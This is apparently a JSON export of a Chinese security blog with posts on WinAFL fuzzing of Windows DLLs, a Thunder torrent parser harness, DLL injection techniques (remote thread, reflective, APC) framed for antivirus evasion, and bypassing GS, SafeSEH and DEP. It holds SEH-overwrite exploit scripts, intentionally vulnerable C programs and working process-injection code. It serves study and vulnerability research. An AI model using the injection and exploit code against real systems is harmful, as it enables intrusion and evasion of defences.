{"meta":{"title":"Joe1sn's Cabinet","subtitle":"","description":"","author":"Joe1sn","url":"https://joe1sn.eu.org","root":"/"},"pages":[],"posts":[{"title":"【漏洞挖掘】win-afl使用指北-中级篇","slug":"win-afl2","date":"2023-07-19T14:06:52.000Z","updated":"2023-07-21T03:32:53.355Z","comments":true,"path":"2023/07/19/win-afl2/","link":"","permalink":"https://joe1sn.eu.org/2023/07/19/win-afl2/","excerpt":"为什么不叫高级篇，因为高级的我也不会 主要讲一下更贴近实际的用法吧 !!!仅大标题1完成，全片未完待续!!!","text":"为什么不叫高级篇，因为高级的我也不会 主要讲一下更贴近实际的用法吧 !!!仅大标题1完成，全片未完待续!!! 对DLL进行Fuzz 理论测试 代码还是上一篇提到的代码，依旧是32位，只不过溢出部分写在DLL里面 dll.c 123456789101112131415161718192021#include &lt;stdio.h&gt;__declspec(dllexport) void vuln(char *FileDir)&#123; char password[6] = &quot;ABCDE&quot;; char str[6]; FILE *fp; if(!(fp=fopen(FileDir,&quot;r&quot;)))&#123; printf(&quot;Open Failed\\n&quot;); exit(0); &#125; fgets(str, 0x1000, fp); str[5]=&#x27;\\0&#x27;; if(strcmp(str,password)==0) // fprintf(stderr,&quot;OK.\\n&quot;); printf(&quot;OK.\\n&quot;); else // fprintf(stderr,&quot;NO.\\n&quot;); printf(&quot;NO.\\n&quot;);&#125; 编译 1gcc -shared -o mydll.dll dll.c main.c 12345678910111213#include &lt;stdio.h&gt;__declspec(dllimport) void vuln();int main(int argc, char *argv[])&#123; if (argc != 2)&#123; printf(&quot;Usage: ./HelloWorld.exe FileName\\n&quot;); return 0; &#125; vuln(argv[1]); return 0;&#125; 1gcc -o main main.c mydll.dll 不想联合编译的话也可以使用GetProAddress来编写如下harness 1234567891011121314151617181920212223242526272829303132#include &lt;stdio.h&gt;#include &lt;windows.h&gt;typedef DWORD(__cdecl *pvuln)(char* aFileName);pvuln vuln = NULL;extern &quot;C&quot; __declspec(dllexport) int main(int argc, char *argv[])&#123; char mydll_path[] = &quot;D:\\\\HackTools\\\\Fuzz\\\\WinAFLFuzz\\\\testcase\\\\dll\\\\mydll.dll&quot;; if (argc != 2)&#123; printf(&quot;Usage: ./HelloWorld.exe FileName\\n&quot;); return 0; &#125; static HMODULE hMyDLL = NULL; hMyDLL = LoadLibraryA(mydll_path); if(hMyDLL == NULL)&#123; printf(&quot;Load DLL Failed\\n&quot;); goto END; &#125; vuln = (pvuln)GetProcAddress(hMyDLL,&quot;vuln&quot;); if(vuln == NULL)&#123; printf(&quot;Get Process Address Failed\\n&quot;); goto END; &#125; vuln(argv[1]);END: if(hMyDLL)&#123; FreeLibrary(hMyDLL); &#125; return 0;&#125; 开始插桩看看 12345678D:\\HackTools\\Fuzz\\__FuzzWork\\dynamorio\\build_Win32\\bin32\\drrun.exe ^-c D:\\HackTools\\Fuzz\\__FuzzWork\\winafl\\build_Win32\\bin\\Release\\winafl.dll -debug ^-debug ^-coverage_module mydll.dll ^-target_module main.exe ^-target_offset 0x16B0 ^-fuzz_iterations 10 -nargs 2 -- ^main.exe .\\in\\password.txt 开始fuzz 12345678910afl-fuzz.exe ^-i .\\in ^-o .\\out ^-D &quot;D:\\HackTools\\Fuzz\\__FuzzWork\\dynamorio\\build_Win32\\bin32&quot; ^-I 100000+ -t 90000+ -- ^-coverage_module mydll.dll ^-target_module main.exe ^-target_offset 0x16B0 ^-fuzz_iterations 5000 -nargs 2 -- ^main.exe @@ 瞬间找到crash 样本长这样 这次尝试使用x32dbg分析 得到EXP 12345678910111213payload = b&quot;&quot;shellcode = b&quot;&quot;offset = b&quot;A&quot;*(0x12c-len(shellcode)-32) #0x1cNSEH = b&quot;\\xeb\\x06\\x90\\x90&quot; #asm(&quot;jmp 6;nop;nop&quot;)gadget = b&quot;\\xEA\\x23\\x40\\x00&quot; #004023EAself_gadget = b&quot;\\x89\\xE0\\x05\\x24\\x06\\x00\\x00\\xFF\\xE0&quot; # mov eax, esp # sub eax, 0x608 # jmp eaxpayload = b&quot;\\xaa&quot;*32+shellcode+offset+NSEH+gadget+self_gadgetwith open(&quot;password.txt&quot;,&quot;wb&quot;) as f: f.write(payload) 要点就是：Fuzz的时候和插桩的时候加上-coverage_module &lt;你的dll&gt; 实际测试 你已经学会了1+1=2，请证明费马大定理吧，为了统一和方便，这里也用看雪里面的一篇文章 使用winafl对迅雷的torrent解析逻辑进行fuzz 首先是找到合适的软件，然后知道他那个功能是在那个dll中的，你可以使用ProcessMonitor查看（俗称procmon），截图没有，特征就是当你打开一个.torrent文件后，thunder.exe会马上加载AssisstantTools.dll。通过查看导出表可以找到一些可以测试的函数，这里我测试的是XL_ParseTorrentFile 查看导入表可以看到依赖的P2PBase.dll 所以fuzz的时候也要加上，开始编写harness，你可以用那篇文章里面的，但是我这里就很慢， 原文文章中的harness由于using附近的代码只在c++11中支持，所以使用gcc编译报错的可以尝试加上-std=c++11 如果你使用的是下面我编写的harness，那么直接编译就可以了 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#include &lt;stdio.h&gt;#include &lt;windows.h&gt;typedef DWORD(__cdecl *pXL_ParseTorrentFile)(CHAR* aFileName, PVOID* a1);pXL_ParseTorrentFile XL_ParseTorrentFile = NULL;typedef DWORD(__cdecl *pXL_ReleaseTorrentFileInfo)(PVOID a1);pXL_ReleaseTorrentFileInfo XL_ReleaseTorrentFileInfo = NULL;extern &quot;C&quot; __declspec(dllexport) void fuzz_method(char *FilePath)&#123; PVOID a1 = NULL; XL_ParseTorrentFile(FilePath, &amp;a1); if (a1) &#123; XL_ReleaseTorrentFileInfo(a1); &#125; return;&#125;int main(int argc, char *argv[])&#123; //char AssisstantToolsPath[] = &quot;D:\\\\HackTools\\\\Fuzz\\\\WinAFLFuzz\\\\testcase\\\\thunder_fuzzer\\\\a.dll&quot;; if (argc != 2)&#123; printf(&quot;Usage: ./HelloWorld.exe FileName\\n&quot;); return 0; &#125; static HMODULE hMyDLL = NULL; hMyDLL = LoadLibraryA(&quot;AssistantTools.dll&quot;); if(hMyDLL == NULL)&#123; printf(&quot;Load DLL Failed\\n&quot;); goto END; &#125; XL_ParseTorrentFile = (pXL_ParseTorrentFile)GetProcAddress(hMyDLL, &quot;XL_ParseTorrentFile&quot;); if(XL_ParseTorrentFile == NULL)&#123; printf(&quot;Get Process Address Failed\\n&quot;); goto END; &#125; XL_ReleaseTorrentFileInfo = (pXL_ReleaseTorrentFileInfo)GetProcAddress(hMyDLL, &quot;XL_ReleaseTorrentFileInfo&quot;); if(XL_ReleaseTorrentFileInfo == NULL)&#123; printf(&quot;Get Process Address Failed\\n&quot;); goto END; &#125; fuzz_method(argv[1]);END: if(hMyDLL)&#123; FreeLibrary(hMyDLL); &#125; printf(&quot;Done\\n&quot;);&#125; 你可以用drrun -t drcov --来测试看是不是使用成功，之后使用drrun测试 12345678&quot;D:\\HackTools\\Fuzz\\__FuzzWork\\dynamorio\\build_Win32\\bin32\\drrun.exe&quot; ^-c winafl.dll -debug ^-coverage_module P2PBase.dll ^-coverage_module AssistantTools.dll ^-target_module fuzz_program.exe ^-target_offset 0x11ef ^-fuzz_iterations 10 -nargs 2 ^-- fuzz_program.exe &quot;D:\\HackTools\\Fuzz\\WinAFLFuzz\\testcase\\thunder_fuzzer\\testin\\ubuntu-18.04.5-desktop-amd64.iso.torrent&quot; 问题1： 如果你使用的Dynamorio是大于 8.0.0-1版本的，很大概率会出现错误类似于下面 这种情况就是生成覆盖率文件是对的，但是测试的时候当程序进行IAT导入的时候，在dynamorio中的harness崩溃了，所以程序还没有进入entry入口点函数就直接寄了。这个错误很有意思，加载类似ntdll.dll或者自己在windows上写的DLL（哪怕无符号）都可以，当harness中的LoadLibrary载入其他DLL的时候（比如某个软件的ffmpeg.dll）也会报错。 这个问题我解决了一天也没有解决，到是在看雪找了一个和我一样的帖子 https://bbs.kanxue.com/thread-274169.htm 最后我的解决方法是更换到dynamorio 8.0.0-1版本过后重新编译就行了 问题2： 当你使用target_method的时候，程序找不到该方法，这在你进行测试winafl案例的时候很常见，原因是该方法没有进行导出，在函数前面加上extern &quot;C&quot; __declspec(dllexport)就行了 首先就是缩减testcase 1python &quot;D:\\HackTools\\Fuzz\\__FuzzWork\\winafl\\winafl-cmin.py&quot; --working-dir &quot;D:\\HackTools\\Fuzz\\__FuzzWork\\winafl\\build_Win32\\bin\\Release&quot; -D &quot;D:\\HackTools\\Fuzz\\__FuzzWork\\dynamorio\\build_Win32\\bin32&quot; -t 9000 -i &quot;D:\\HackTools\\Fuzz\\WinAFLFuzz\\testcase\\thunder_fuzzer\\testin&quot; -o &quot;D:\\HackTools\\Fuzz\\WinAFLFuzz\\testcase\\thunder_fuzzer\\in&quot; -coverage_module AssistantTools.dll -coverage_module P2PBase.dll -target_module fuzz_program.exe -target_method fuzz_method -nargs 1 -- fuzz_program.exe @@ 然后开始fuzz，开启一个Master吧 123456789101112afl-fuzz.exe ^-M master ^-i &quot;D:\\HackTools\\Fuzz\\WinAFLFuzz\\testcase\\thunder_fuzzer\\in&quot; ^-o &quot;D:\\HackTools\\Fuzz\\WinAFLFuzz\\testcase\\thunder_fuzzer\\out&quot; ^-D &quot;D:\\HackTools\\Fuzz\\__FuzzWork\\dynamorio\\build_Win32\\bin32&quot; ^-I 100000+ -t 9000 -- ^-coverage_module AssistantTools.dll ^-coverage_module P2PBase.dll ^-target_module fuzz_program.exe ^-target_method fuzz_method ^-fuzz_iterations 5000 -nargs 1 -- ^fuzz_program.exe @@ -M: 指定这是一个Master进程 -i -：当fuzz暂停的时候恢复，在AFL上是-in -，具体用法 12345afl-fuzz.exe ^-M master ^-i -&quot;D:\\HackTools\\Fuzz\\WinAFLFuzz\\testcase\\thunder_fuzzer\\in&quot; ^-o &quot;D:\\HackTools\\Fuzz\\WinAFLFuzz\\testcase\\thunder_fuzzer\\out&quot; ^.... 自己改写的harness确实快，但也不至于一下子就跑出来，这里我用旧版本的迅雷试了下 也就是一个被修复的÷0报错（EXCEPTION_INT_DIVIDE_BY_ZERO） 昨天16h高强度修复问题1，暂时更新到这里","categories":[{"name":"CVE","slug":"CVE","permalink":"https://joe1sn.eu.org/categories/CVE/"}],"tags":[{"name":"CVE","slug":"CVE","permalink":"https://joe1sn.eu.org/tags/CVE/"},{"name":"fuzz","slug":"fuzz","permalink":"https://joe1sn.eu.org/tags/fuzz/"}]},{"title":"【漏洞挖掘】win-afl使用指北-初级篇","slug":"win-afl","date":"2023-07-18T07:27:44.000Z","updated":"2023-07-19T14:08:42.244Z","comments":true,"path":"2023/07/18/win-afl/","link":"","permalink":"https://joe1sn.eu.org/2023/07/18/win-afl/","excerpt":"在21年的时候曾经小小的使用了一点WinAFL，现在再回过头来做笔记 这里主要讲述WinAFL+DynamoRIO的Fuzz方法","text":"在21年的时候曾经小小的使用了一点WinAFL，现在再回过头来做笔记 这里主要讲述WinAFL+DynamoRIO的Fuzz方法 简介 知道创宇这篇文章讲的已经很好了：https://paper.seebug.org/323/ 由于闭源特点，那么需要使用DynamoRIO进行插桩，检测指令块的转移 WinAFL主要特点就是将AFL中的函数使用WinAPI进行重写，然后调用DynamoRIO的API完成fuzz 编译 主要是参考了https://bbs.kanxue.com/thread-261323.htm和官方过程：https://dynamorio.org/page_building.html DynamoRIO 32位 1. 编译 软件下载一把梭 1234git clone https://github.com/DynamoRIO/dynamorio.gitcd dynamoriomkdir build_Win32mkdir build_x64 这里我使用的是x86 Native Tools Command Prompt命令行 1cmake -G&quot;Visual Studio 16&quot; -A Win32 .. 如果发现缺少什么的话，使用set Name=Value再编译，最后 1cmake --build . --config RelWithDebInfo 2. 测试 1&quot;D:\\HackTools\\Fuzz\\__FuzzWork\\dynamorio\\build_win32\\bin32\\drrun.exe&quot; -t drcov -- &quot;D:\\HackTools\\Fuzz\\WinAFLFuzz\\testcase\\32\\HelloWorld.exe&quot; &quot;D:\\HackTools\\Fuzz\\WinAFLFuzz\\testcase\\32\\password.txt&quot; 这里我换成了老版本 dynamorio-cronbuild-8.0.18684，因为新版本是3.0版本的覆盖率文件，IDA Lighthouse只支持2.0，不过你可以通过https://gist.github.com/wumb0/de671cc5051353fd32af4aecc811a282进行版本的转换。 64位 1. 编译 按照官方的步骤 1%comspec% /k &quot;C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Enterprise\\VC\\Auxiliary\\Build\\vcvarsamd64_x86.bat&quot; 或者启动 1Developer Command Prompt for VS 2019 然后进行cmake配置 1cmake -A x64 .. 就可以参考看雪那篇文章修改下报错 利用cmake-gui修改完过后就可以继续回到cmd进行编译了（也可以用vs2019） 2. 测试 WinAFL 起手式 12345git clone https://github.com/googleprojectzero/winafl.gitcd winaflgit submodule update --init --recursivemkdir build_Win32mkdir build_x64 编译32位 12cmake -G&quot;Visual Studio 16 2019&quot; .. -A Win32 -DDynamoRIO_DIR=D:\\HackTools\\Fuzz\\__FuzzWork\\dynamorio\\build_Win32\\cmake -DINTELPT=1 -DUSE_COLOR=1cmake --build . --config Release 如果显示drgui不完整，返回去在生成就行了，看雪上的教程是没有问题的 编译64位 12cmake -G&quot;Visual Studio 16 2019&quot; -A x64 .. -DDynamoRIO_DIR=&quot;D:\\HackTools\\Fuzz\\__FuzzWork\\dynamorio\\build_x64\\cmake&quot; -DINTELPT=1 -DUSE_COLOR=1cmake --build . --config Release 测试 32位 首先进行插桩 123456789101112131415161718@echo off:: 接受用户输入set /p target_module=traget excutable : set /p target_offset=traget offset : set /p sample=pins sample: :: 输出用户输入的内容echo target_module, %target_module%!echo target_offset, %target_offset%!echo sample, %sample%!D:\\HackTools\\Fuzz\\__FuzzWork\\dynamorio\\build_Win32\\bin32\\drrun.exe ^-c D:\\HackTools\\Fuzz\\__FuzzWork\\winafl\\build_Win32\\bin\\Release\\winafl.dll -debug ^-target_module %target_module% ^-target_offset %target_offset% ^-fuzz_iterations 10 -nargs 2 -- ^%target_module% %sample% 123456D:\\HackTools\\Fuzz\\__FuzzWork\\dynamorio\\build_Win32\\bin32\\drrun.exe ^-c D:\\HackTools\\Fuzz\\__FuzzWork\\winafl\\build_Win32\\bin\\Release\\winafl.dll -debug ^-target_module test.exe ^-target_offset 0x1210 ^-fuzz_iterations 10 -nargs 2 -- ^test.exe .\\in\\password.txt 查看生成的log文件，如果有Everything appears to be running normally.那么就是完成了 开始fuzz 12345678910afl-fuzz.exe ^-i .\\in ^-o &quot;D:\\HackTools\\Fuzz\\WinAFLFuzz\\out&quot; ^-D &quot;D:\\HackTools\\Fuzz\\__FuzzWork\\dynamorio\\build_Win32\\bin32&quot; ^-I 100000+ -t 90000+ -- ^-coverage_module test.exe ^-target_module test.exe ^-target_offset 0x1210 ^-fuzz_iterations 5000 -nargs 1 -- ^test.exe @@ 64位 过程也差不多 先插桩 123456traget excutable : test.exetraget offset : 0x1200pins sample: .\\in\\input.bmptarget_module, test.exe!target_offset, 0x1200! sample, .\\in\\input.bmp! 然后fuzz 12345678910afl-fuzz.exe ^-i .\\in ^-o .\\out ^-D &quot;D:\\HackTools\\Fuzz\\__FuzzWork\\dynamorio\\build_x64\\bin64&quot; ^-I 100000+ -t 90000+ -- ^-coverage_module test.exe ^-target_module test.exe ^-target_offset 0x1210 ^-fuzz_iterations 5000 -nargs 1 -- ^test.exe @@ 测试2 - SimpleHunt 在之前我的博客写了windows下栈溢出的过程，这里我改写了下 1234567891011121314151617181920212223242526272829303132333435363738#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt; void hacked()&#123; printf(&quot;Hacked\\n&quot;);&#125;void vuln(char *FileDir)&#123; char password[6] = &quot;ABCDE&quot;; char str[6]; FILE *fp; if(!(fp=fopen(FileDir,&quot;r&quot;)))&#123; printf(&quot;Open Failed\\n&quot;); exit(0); &#125; fgets(str, 0x1000, fp); str[5]=&#x27;\\0&#x27;; if(strcmp(str,password)==0) // fprintf(stderr,&quot;OK.\\n&quot;); printf(&quot;OK.\\n&quot;); else // fprintf(stderr,&quot;NO.\\n&quot;); printf(&quot;NO.\\n&quot;);&#125;int main(int argc, char *argv[])&#123; if (argc != 2)&#123; printf(&quot;Usage: ./HelloWorld.exe FileName\\n&quot;); return 0; &#125; vuln(argv[1]); return 0;&#125; 1gcc HelloWorld.c -o HelloWorld 没有任何保护，这里以32位举例 fuzz 由于代码比较简单，不需要先生成覆盖率文件找到关键函数，所以首先还是插桩 123456D:\\HackTools\\Fuzz\\__FuzzWork\\dynamorio\\build_Win32\\bin32\\drrun.exe ^-c D:\\HackTools\\Fuzz\\__FuzzWork\\winafl\\build_Win32\\bin\\Release\\winafl.dll -debug ^-target_module HelloWorld.exe ^-target_offset 0x16c4 ^-fuzz_iterations 10 -nargs 2 -- ^HelloWorld.exe in\\password.txt 开始fuzz 12345678910afl-fuzz.exe ^-i &quot;D:\\HackTools\\Fuzz\\WinAFLFuzz\\in&quot; ^-o &quot;D:\\HackTools\\Fuzz\\WinAFLFuzz\\out&quot; ^-D &quot;D:\\HackTools\\Fuzz\\__FuzzWork\\dynamorio\\build_Win32\\bin32&quot; ^-I 100000+ -t 90000+ -- ^-coverage_module HelloWorld.exe ^-target_module HelloWorld.exe ^-target_offset 0x16c4 ^-fuzz_iterations 5000 -nargs 2 -- ^HelloWorld.exe @@ 瞬间找到一个crash PoC 使用x32dbg进行调试 刚好修改了EBP寄存器导出错误，很明显的栈溢出。 具体的EXP构造方法就是使用SEH加载shellcode，具体的在之前的文章已经写过了 写出exp 1234567891011payload = b&quot;&quot;shellcode = b&quot;&quot;offset = b&quot;A&quot;*(0x12c-len(shellcode)-32) #0x1cNSEH = b&quot;\\xeb\\x06\\x90\\x90&quot; #asm(&quot;jmp 6;nop;nop&quot;)gadget = b&quot;\\x9A\\x24\\x40\\x00&quot; #40249Aself_gadget = b&quot;\\x89\\xE0\\x05\\x24\\x06\\x00\\x00\\xFF\\xE0&quot;payload = b&quot;\\xaa&quot;*32+shellcode+offset+NSEH+gadget+self_gadgetwith open(&quot;password.txt&quot;,&quot;wb&quot;) as f: f.write(payload) 参考 https://paper.seebug.org/323/ https://bbs.kanxue.com/thread-261323.htm","categories":[{"name":"CVE","slug":"CVE","permalink":"https://joe1sn.eu.org/categories/CVE/"}],"tags":[{"name":"CVE","slug":"CVE","permalink":"https://joe1sn.eu.org/tags/CVE/"},{"name":"fuzz","slug":"fuzz","permalink":"https://joe1sn.eu.org/tags/fuzz/"}]},{"title":"【免杀】DLL注入小结","slug":"dll-injector","date":"2023-07-17T11:24:51.000Z","updated":"2023-07-18T01:30:41.396Z","comments":true,"path":"2023/07/17/dll-injector/","link":"","permalink":"https://joe1sn.eu.org/2023/07/17/dll-injector/","excerpt":"DLL 注入进化史","text":"DLL 注入进化史 远程线程调用注入 这个是最简单的 这里我接受的是程序的进程PID和待注入DLL的路径szPath 12345678910111213141516171819202122232425void DLLinjector::DllOnLoad() &#123; if (!this-&gt;Check())&#123; wcout &lt;&lt; &quot;The Process or DLL file not found\\n&quot;; return; &#125; //向目标进程写入DLL的路径 SIZE_T dwWriteSize = 0; HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, this-&gt;dwPid); LPVOID pAddress = VirtualAllocEx(hProcess, NULL, 0x100, MEM_COMMIT, PAGE_READWRITE); WriteProcessMemory(hProcess, pAddress, this-&gt;szPath, wcslen(this-&gt;szPath)*2+2, &amp;dwWriteSize); //从ntdll导出 LoadLibraryA 函数 HMODULE Ntdll = LoadLibraryA(&quot;ntdll.dll&quot;); LPVOID LoadLibraryBase = GetProcAddress(GetModuleHandle(L&quot;kernel32.dll&quot;), &quot;LoadLibraryA&quot;); HANDLE hRemoteProcess = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)LoadLibraryW,pAddress,NULL,NULL); WaitForSingleObject(hRemoteProcess, -1); //释放资源 VirtualFreeEx(hProcess, pAddress, 0x300, MEM_COMMIT); CloseHandle(hProcess); FreeModule(Ntdll); wcout &lt;&lt; &quot;injection complete\\n&quot;;&#125; 反射DLL注入 这里找了一张先知的图，上面说了反射DLL注入的流程，原文在这里https://xz.aliyun.com/t/11072 最大的区别就是我们没有使用LoadLibarary这个函数，而是相当于自己写了一个DLL加载器 仔细观察过程就看得出来，远程线程调用注入写入的是DLL路径，然后创建远程调用LoadLibarary（LPTHREAD_START_ROUTINE） 反射DLL注入是将整个文件解析过后，获得必要的dll句柄和函数为修复导入表做准备，分配一块新内存去取解析dll，并把pe头复制到新内存中和将各节复制到新内存中，修复导入表和重定向表，执行DllMain()函数。 群里聊到了进程迁移技术，msf上的migrate原理就是反射DLL注入 读取metsrv.dll（metpreter payload模板dll）文件到内存中。 生成最终的payload。 a) msf生成一小段汇编migrate stub主要用于建立socket连接。 b) 将metsrv.dll的dos头修改为一小段汇编meterpreter_loader主要用于调用reflective loader函数和dllmain函数。在metsrv.dll的config block区填充meterpreter建立session时的配置信息。 c) 最后将migrate stub和修改后的metsrv.dll拼接在一起生成最终的payload。 向msf server发送migrate请求和payload。 msf向迁移目标进程分配一块内存并写入payload。 msf首先会创建的远程线程执行migrate stub，如果失败了，就会尝试用apc注入的方式执行migrate stub。migrate stub会调用meterpreter loader，meterpreter loader才会调用reflective loader。 reflective loader进行反射式dll注入。 最后msf client和msf server建立一个新的session。 这里就不自己写了，参考的是https://github.com/stephenfewer/ReflectiveDLLInjection 首先需要描述的就是DLL的解析过程 1234567891011121314151617181920212223242526do&#123; if( !hProcess || !lpBuffer || !dwLength ) break; // check if the library has a ReflectiveLoader... dwReflectiveLoaderOffset = GetReflectiveLoaderOffset( lpBuffer ); if( !dwReflectiveLoaderOffset ) break; // alloc memory (RWX) in the host process for the image... lpRemoteLibraryBuffer = VirtualAllocEx( hProcess, NULL, dwLength, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE ); if( !lpRemoteLibraryBuffer ) break; // write the image into the host process... if( !WriteProcessMemory( hProcess, lpRemoteLibraryBuffer, lpBuffer, dwLength, NULL ) ) break; // add the offset to ReflectiveLoader() to the remote library address... lpReflectiveLoader = (LPTHREAD_START_ROUTINE)( (ULONG_PTR)lpRemoteLibraryBuffer + dwReflectiveLoaderOffset ); // create a remote thread in the host process to call the ReflectiveLoader! hThread = CreateRemoteThread( hProcess, NULL, 1024*1024, lpReflectiveLoader, lpParameter, (DWORD)NULL, &amp;dwThreadId );&#125; while( 0 ); lpBuffer就是读取到内存中的DLL的数据 12345678910111213141516171819202122232425262728293031323334353637383940414243// uiNameArray = the address of the modules export directory entryuiNameArray = (UINT_PTR)&amp;((PIMAGE_NT_HEADERS)uiExportDir)-&gt;OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];// get the File Offset of the export directoryuiExportDir = uiBaseAddress + Rva2Offset( ((PIMAGE_DATA_DIRECTORY)uiNameArray)-&gt;VirtualAddress, uiBaseAddress );// get the File Offset for the array of name pointersuiNameArray = uiBaseAddress + Rva2Offset( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;AddressOfNames, uiBaseAddress );// get the File Offset for the array of addressesuiAddressArray = uiBaseAddress + Rva2Offset( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;AddressOfFunctions, uiBaseAddress );// get the File Offset for the array of name ordinalsuiNameOrdinals = uiBaseAddress + Rva2Offset( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;AddressOfNameOrdinals, uiBaseAddress ); // get a counter for the number of exported functions...dwCounter = ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;NumberOfNames;// loop through all the exported functions to find the ReflectiveLoaderwhile( dwCounter-- )&#123; char * cpExportedFunctionName = (char *)(uiBaseAddress + Rva2Offset( DEREF_32( uiNameArray ), uiBaseAddress )); if( strstr( cpExportedFunctionName, &quot;ReflectiveLoader&quot; ) != NULL ) &#123; // get the File Offset for the array of addresses uiAddressArray = uiBaseAddress + Rva2Offset( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;AddressOfFunctions, uiBaseAddress ); // use the functions name ordinal as an index into the array of name pointers uiAddressArray += ( DEREF_16( uiNameOrdinals ) * sizeof(DWORD) ); // return the File Offset to the ReflectiveLoader() functions code... return Rva2Offset( DEREF_32( uiAddressArray ), uiBaseAddress ); &#125; // get the next exported function name uiNameArray += sizeof(DWORD); // get the next exported function name ordinal uiNameOrdinals += sizeof(WORD);&#125;return 0; GetReflectiveLoaderOffset就是解析文件头找到DLL的导出表，如果发现ReflectiveLoader的函数，那么返回在hProcess的内存文件中的位置 然后回到LoadRemoteLibraryR使用CreateRemoteThread进行注入 关于RVA和VA的计算可以参考我很早写的一篇博客：PE文件结构中的RVA与RAW 现在可以看一下他的DLL是如何构造的 首先存在一个导出函数 通过阅读这个函数的代码发现 使用_ReturnAddress获得调用完成的返回地址，反推初DLL的基地址 通过PEB得到LoadLibraryA、GetProcAddress、VirtualAlloc，使用NtFlushInstructionCache暂时存储其他导入表的函数 迁移之前的DLL镜像到新的位置 覆写迁移后的文件头的节区位置 使用刚才导入的LoadLibraryA、GetProcAddress修复IAT 处理重定向相关 找到DLLMain并跳转后执行 APC注入 在最开始的远程线程调用注入使用的是TH32CS_SNAPPROCESS，这里就是利用KiUserDispatch调度进行APC例程调用，让线程使用LoadLibarary进行注入 123456789101112131415161718192021THREADENTRY32 te = &#123; sizeof(THREADENTRY32) &#125;;HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);if (INVALID_HANDLE_VALUE == hThreadSnap) &#123; std::cout &lt;&lt; &quot;Error In APC Injection\\n&quot;;&#125;BOOL bStat = FALSE;//得到第一个线程if (Thread32First(hThreadSnap, &amp;te)) &#123; do &#123; if (te.th32OwnerProcessID == this-&gt;dwPid) &#123; HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID); if (hThread) &#123; DWORD dwRet = QueueUserAPC((PAPCFUNC)LoadLibraryW, hThread, (ULONG_PTR)pAddress); if (dwRet &gt; 0) bStat = TRUE; &#125; CloseHandle(hThread); &#125; &#125; while (Thread32Next(hThreadSnap, &amp;te));&#125;CloseHandle(hThreadSnap); 还有一个技巧就是使用NTDLL中的未导出函数NtTestAlert就可以立即调用APC例程 上面的把hProcess = GetCurrentProcess()，pAddress = shellcode_Address相当于使用DLL注入进行免杀了","categories":[{"name":"program","slug":"program","permalink":"https://joe1sn.eu.org/categories/program/"}],"tags":[{"name":"malware","slug":"malware","permalink":"https://joe1sn.eu.org/tags/malware/"},{"name":"C","slug":"C","permalink":"https://joe1sn.eu.org/tags/C/"}]},{"title":"【Win Pwn】基础栈溢出保护绕过","slug":"win-pwn-stack2","date":"2023-07-12T14:29:58.000Z","updated":"2023-07-13T12:25:05.423Z","comments":true,"path":"2023/07/12/win-pwn-stack2/","link":"","permalink":"https://joe1sn.eu.org/2023/07/12/win-pwn-stack2/","excerpt":"针对栈攻击的防护与绕过","text":"针对栈攻击的防护与绕过 GS GS本质上和Linux GCC中的canary很相似，他在栈帧的结尾（EBP之前）插入一给DWORD类型的值，其副本存在于.data中。 在编译的时候并不会存在GS保护有下面几种情况 函数不包含缓冲区 函数被定义为具有变量参数列表 函数使用无保护的关键字标记 函数在第一个语句中包含内嵌汇编代码 缓冲区不是 8 字节类型且大小不大于 4 个字节 不过仍然可以采用#pragma strict_gs_check 强制启用GS保护 12345678910111213#include &quot;string.h&quot;int vulfuction(char* str)&#123; char arry[4]; strcpy(arry, str); return 1;&#125;int main()&#123; char* str = &quot;yeah,i have GS protection&quot;; vulfuction(str); return 0;&#125; 绕过方式要漏洞类型灵活选择 如果是可以泄露那么泄露后拼接再溢出 再C++中，struct和class除了访问权限没有不同，那么有机会可以通过修改函数指针（比如虚函数）来进行RCE 如果存在任意地址写或者能过写道.data段（比如存在字符串格式化漏洞），可以将对比的cookie设置为特定值 GS机制没有存在SEH的保护，所以 【Win Pwn】基础栈溢出利用 中的利用手段仍然能够成功，只是溢出长度和ROP的Gadget需要重新设置。 1234567891011121314151617from ae64 import AE64payload = b&quot;&quot;shellcode = b&quot;&quot;offset = b&quot;A&quot;*(0x160-len(shellcode)-16) #0x1ctest_func = b&quot;\\xc4\\x16\\x40\\x00&quot; #004016C4NSEH = b&quot;\\xeb\\x06\\x90\\x90&quot; #asm(&quot;jmp 6;nop;nop&quot;)gadget = b&quot;\\x9e\\x26\\x41\\x00&quot; #0041269Eself_gadget = b&quot;\\x89\\xE0\\x05\\x2c\\x07\\x00\\x00\\xFF\\xE0&quot; # mov eax, esp # sub eax, 0x64c;//sub eax, 0x608 # jmp eaxpayload = b&quot;\\xaa&quot;*16+shellcode+offset+NSEH+gadget+self_gadgetwith open(&quot;password.txt&quot;,&quot;wb&quot;) as f: f.write(payload) SafeSEH 0day那本书上信息有点…过时了，这里可以参考微软的官方定义/SAFESEH（映像具有安全异常处理程序），主要识别方法就是在.rdata中存在IMAGE_LOAD_CONFIG_DIRECTORY32_2 通过RtlDispatchException函数实现 比较通杀的方法就是 不使用SEH 在堆区上布置shellcode然后执行 这里改动一下源代码 把SEH的地址手动改为堆地址 经过校验后直接到堆中执行了 P3是重启了一次后截图，地址可能会不一样 总结一下就是地址的ROP必须符合验证的权限，但是没有开启SafeSEH的DLL文件中的Gadget、没有DEP时候的堆地址都可以使用。 DEP DEP是类似于Windows上的NX，作用是禁止堆栈的数据拥有执行的权限，避免了Shellcode直接执行。 操作系统通过设置内存页的 NX/XD 属性标记，来指明不能从该内存执行代码。为了实现 这个功能，需要在内存的页面表（Page T able）中加入一个特殊的标识位（NX/XD）来标识是 否允许在该页上执行指令。当该标识位设置为 0 里表示这个页面允许执行指令，设置为 1 时表 示该页面不允许执行指令。 关于NX保护也可以手动查看 